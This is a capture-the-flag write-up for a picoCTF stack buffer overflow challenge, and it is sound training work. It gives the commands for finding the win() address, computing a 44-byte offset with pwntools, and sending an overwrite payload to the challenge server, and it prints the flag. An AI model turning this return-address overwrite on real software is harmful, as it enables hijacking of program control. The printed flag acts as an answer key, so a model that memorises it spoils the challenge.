# URL
https://play.picoctf.org/practice/challenge/258?category=6&page=3

# Challenge:
Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.
You can view source here. And connect with it using nc saturn.picoctf.net 64721

# Work:

* Running GDB and looking through the functions

<img width="1152" height="700" alt="image" src="https://github.com/user-attachments/assets/0285e48f-0909-4fce-8419-eca6bf7ed511" />

* The address of the win() function is 0x080491f6

<img width="1671" height="73" alt="image" src="https://github.com/user-attachments/assets/d1c996ec-d89e-4213-82c8-91902ab5ab08" />

* Use cyclic from pwn to generate a string (i.e, when we don't know the buffer length)

```
>>> print(cyclic(200))
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
>>> 
```

<img width="1690" height="501" alt="image" src="https://github.com/user-attachments/assets/a3a4d37d-46f6-4b09-a186-52fdcc903f3d" />

* The offset is 44 bits
```
>>> print(cyclic_find(0x6161616c))
44
```

* With this knowledge, we can craft a payload!

```
>>> "A"*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x80491f6)
b'\xf6\x91\x04\x08'
```

* Inputting 44 A's along with helo outputs helo
<img width="1269" height="731" alt="image" src="https://github.com/user-attachments/assets/82a39eaf-07d9-4fe1-9845-9cc1997930c0" />

* Now, instead of hello, we do ```\xf6\x91\x04\x08```

```
r <<< $(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08")
```
<img width="1160" height="98" alt="image" src="https://github.com/user-attachments/assets/704d9f8d-2c67-4ad8-b6db-e1cce9db0fcf" />

* This code successfuly jumps to the win() address so we know this payload works
* Now test this payload against the server
<img width="1383" height="110" alt="image" src="https://github.com/user-attachments/assets/fc2fb10b-c798-4e70-a26f-1fb6776f5f85" />

* That's the flag! picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}


